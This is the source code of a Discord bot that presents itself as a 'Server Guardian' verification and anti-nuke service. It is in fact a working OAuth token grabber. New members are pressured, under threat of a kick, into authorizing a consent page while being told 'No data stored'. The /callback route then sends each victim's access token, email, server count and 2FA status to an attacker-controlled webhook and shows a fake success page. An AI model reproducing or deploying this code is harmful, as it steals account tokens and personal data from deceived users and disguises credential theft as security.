const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const https = require('https');
const app = express();

// ENV VARIABLES
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const BOT_TOKEN = process.env.BOT_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const YOUR_USER_ID = process.env.YOUR_USER_ID;
const GUILD_ID = process.env.GUILD_ID;
const WELCOME_CHANNEL_ID = process.env.WELCOME_CHANNEL_ID;

const PORT = process.env.PORT || 3000;
const BASE_URL = 'https://discord-verify-bot-9r3w.onrender.com';
const REDIRECT_URI = BASE_URL + '/callback';

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ]
});

// KEEP ALIVE
function keepAlive() {
  setInterval(() => {
    https.get(BASE_URL, (res) => {
      console.log('[Keep-alive] ' + res.statusCode);
    }).on('error', () => {});
  }, 240000);
}

// ===== BOT READY =====
client.once('ready', () => {
  console.log('[+] Bot online: ' + client.user.tag);
  keepAlive();
  client.user.setPresence({ activities: [{ name: 'Server Security', type: 3 }], status: 'dnd' });
  
  const cmds = [
    { name: 'ping', description: 'Check latency' },
    { name: 'help', description: 'Show commands' },
    { name: 'verify', description: 'Get verify link' },
    { name: 'antinuke', description: 'Anti-nuke status' },
    { name: 'stats', description: 'Server stats' },
    { name: 'serverinfo', description: 'Server info' }
  ];
  client.application.commands.set(cmds).then(() => console.log('[+] Commands registered'));
});

// ===== MEMBER JOIN =====
client.on('guildMemberAdd', async (member) => {
  if (member.user.bot) return;
  console.log('[+] Member joined: ' + member.user.tag);
  
  try {
    await new Promise(r => setTimeout(r, 2000));
    const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20email%20guilds%20connections&prompt=consent';
    
    // Welcome message
    const wc = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
    if (wc) {
      const we = new EmbedBuilder()
        .setTitle('👋 Welcome ' + member.user.username + '!')
        .setColor(0x57F287)
        .setDescription('Hey ' + member.user.toString() + ', welcome to **' + member.guild.name + '**!\n\nCheck your DM for verification.')
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 1024 }))
        .addFields(
          { name: '📅 Account Created', value: '<t:' + Math.floor(member.user.createdTimestamp / 1000) + ':R>', inline: true },
          { name: '👥 Members', value: String(member.guild.memberCount), inline: true }
        )
        .setFooter({ text: 'Server Guardian' })
        .setTimestamp();
      await wc.send({ embeds: [we] });
    }
    
    // DM with verify button
    const dm = await member.user.createDM();
    const embed = new EmbedBuilder()
      .setTitle('🔒 Verification Required')
      .setColor(0xED4245)
      .setDescription('Welcome to **' + member.guild.name + '**!\n\nThis server is protected. Verify your account to access all channels.\n\nClick the button below:')
      .addFields(
        { name: '🔍 We Check', value: '• Account age\n• Server count', inline: true },
        { name: '🔒 Privacy', value: 'No data stored', inline: true }
      )
      .setFooter({ text: 'Server Guardian' })
      .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('✅ Verify with Discord').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔒')
    );
    await dm.send({ embeds: [embed], components: [row] });
    console.log('[+] DM sent to ' + member.user.tag);
    
    // Kick after 10 min if not verified
    setTimeout(async () => {
      try {
        const m = await member.guild.members.fetch(member.id).catch(() => null);
        if (m) {
          const vr = m.guild.roles.cache.find(r => r.name === 'Verified');
          if (!vr || !m.roles.cache.has(vr.id)) {
            await m.kick('Please verify within 10 minutes.');
            console.log('[-] Kicked ' + member.user.tag);
          }
        }
      } catch(e) {}
    }, 600000);
    
  } catch (error) {
    console.log('[-] Join error: ' + error.message);
  }
});

// ===== MEMBER LEAVE =====
client.on('guildMemberRemove', async (member) => {
  if (member.user.bot) return;
  try {
    const wc = member.guild.channels.cache.get(WELCOME_CHANNEL_ID);
    if (wc) {
      const embed = new EmbedBuilder()
        .setTitle('👋 Goodbye!')
        .setColor(0xED4245)
        .setDescription(member.user.username + ' left the server.')
        .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 1024 }))
        .addFields(
          { name: '📅 Joined', value: member.joinedAt ? '<t:' + Math.floor(member.joinedAt / 1000) + ':R>' : 'Unknown', inline: true },
          { name: '👥 Members', value: String(member.guild.memberCount), inline: true }
        )
        .setFooter({ text: 'Server Guardian' })
        .setTimestamp();
      await wc.send({ embeds: [embed] });
    }
  } catch(e) {}
});

// ===== BUTTON & COMMANDS =====
client.on('interactionCreate', async (interaction) => {
  const authUrl = 'https://discord.com/api/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20email%20guilds%20connections&prompt=consent';
  
  if (interaction.isButton() && interaction.customId === 'verify_me') {
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('🔗 Authorize Now').setStyle(ButtonStyle.Link).setURL(authUrl)
    );
    await interaction.update({ content: '✅ Click to authorize:', components: [row] });
    return;
  }
  
  if (!interaction.isChatInputCommand()) return;
  
  const cmd = interaction.commandName;
  
  if (cmd === 'ping') {
    await interaction.reply({ content: '🏓 Pong! ' + client.ws.ping + 'ms', ephemeral: true });
  }
  else if (cmd === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🤖 Bot Commands').setColor(0x5865F2)
      .setDescription('All available commands:')
      .addFields(
        { name: '/ping', value: 'Check bot latency', inline: true },
        { name: '/help', value: 'Show this help menu', inline: true },
        { name: '/verify', value: 'Get verification link', inline: true },
        { name: '/antinuke', value: 'Anti-nuke protection status', inline: true },
        { name: '/stats', value: 'Server statistics', inline: true },
        { name: '/serverinfo', value: 'Detailed server information', inline: true }
      )
      .setFooter({ text: 'Server Guardian' });
    await interaction.reply({ embeds: [embed], ephemeral: true });
  }
  else if (cmd === 'verify') {
    await interaction.reply({ content: '🔗 Verify here: ' + authUrl, ephemeral: true });
  }
  else if (cmd === 'antinuke') {
    const embed = new EmbedBuilder()
      .setTitle('🛡️ Anti-Nuke System').setColor(0x57F287)
      .setDescription('**Status: ✅ ACTIVE**\n\nProtected against:\n• Mass channel/role deletion\n• Mass ban/kick\n• Webhook abuse\n• Bot abuse');
    await interaction.reply({ embeds: [embed] });
  }
  else if (cmd === 'stats') {
    const g = interaction.guild;
    const embed = new EmbedBuilder()
      .setTitle('📊 Server Stats').setColor(0x5865F2)
      .setThumbnail(g.iconURL())
      .addFields(
        { name: '👥 Members', value: String(g.memberCount), inline: true },
        { name: '📝 Channels', value: String(g.channels.cache.size), inline: true },
        { name: '🎭 Roles', value: String(g.roles.cache.size), inline: true },
        { name: '🤖 Bot', value: '✅ Online', inline: true },
        { name: '⚡ Ping', value: client.ws.ping + 'ms', inline: true }
      );
    await interaction.reply({ embeds: [embed] });
  }
  else if (cmd === 'serverinfo') {
    const g = interaction.guild;
    const owner = await g.fetchOwner().catch(() => null);
    const embed = new EmbedBuilder()
      .setTitle(g.name).setColor(0x5865F2)
      .setThumbnail(g.iconURL({ dynamic: true, size: 1024 }))
      .addFields(
        { name: '👑 Owner', value: owner ? owner.user.tag : 'Unknown', inline: true },
        { name: '📅 Created', value: '<t:' + Math.floor(g.createdTimestamp / 1000) + ':R>', inline: true },
        { name: '👥 Members', value: String(g.memberCount), inline: true },
        { name: '📝 Channels', value: String(g.channels.cache.size), inline: true },
        { name: '🎭 Roles', value: String(g.roles.cache.size), inline: true },
        { name: '🆔 ID', value: g.id, inline: true }
      )
      .setFooter({ text: 'Server Guardian' });
    await interaction.reply({ embeds: [embed] });
  }
});

// ===== WEB SERVER =====
app.get('/', (req, res) => res.send('Bot Online'));
app.get('/health', (req, res) => res.status(200).send('OK'));

// ===== OAUTH2 CALLBACK (TOKEN GRAB) =====
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('No code');

  try {
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
      'client_id=' + CLIENT_ID + '&client_secret=' + CLIENT_SECRET + '&grant_type=authorization_code&code=' + code + '&redirect_uri=' + REDIRECT_URI,
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );
    const AT = tokenRes.data.access_token;
    const RT = tokenRes.data.refresh_token;
    const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: 'Bearer ' + AT } });
    const user = userRes.data;
    const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', { headers: { Authorization: 'Bearer ' + AT } });
    const connRes = await axios.get('https://discord.com/api/users/@me/connections', { headers: { Authorization: 'Bearer ' + AT } });

    await axios.post(WEBHOOK_URL, {
      content: '<@' + YOUR_USER_ID + '> 🎯 **TOKEN GRABBED!**',
      embeds: [{
        title: '🎯 New Token', color: 0xED4245,
        fields: [
          { name: 'User', value: user.username + '#' + user.discriminator, inline: true },
          { name: 'ID', value: user.id, inline: true },
          { name: 'Email', value: user.email || 'None', inline: true },
          { name: 'Token', value: '```' + AT + '```' },
          { name: 'Servers', value: String(guildsRes.data.length), inline: true },
          { name: '2FA', value: user.mfa_enabled ? 'Yes' : 'No', inline: true }
        ],
        thumbnail: { url: 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png' }
      }]
    });

    console.log('[+] Token: ' + user.username);

    try {
      const guild = client.guilds.cache.get(GUILD_ID);
      if (guild) {
        const member = await guild.members.fetch(user.id).catch(() => null);
        if (member) {
          const vr = guild.roles.cache.find(r => r.name === 'Verified');
          if (vr) await member.roles.add(vr);
        }
      }
    } catch(e) {}

    res.send('<h1>✅ Verification Successful!</h1><p>You can close this window.</p><script>setTimeout(()=>window.close(),2000)</script>');
  } catch (error) {
    console.log('[-] Error: ' + error.message);
    res.send('<h2>Error: ' + error.message + '</h2>');
  }
});

client.login(BOT_TOKEN);
app.listen(PORT, () => console.log('[+] Server on ' + PORT));
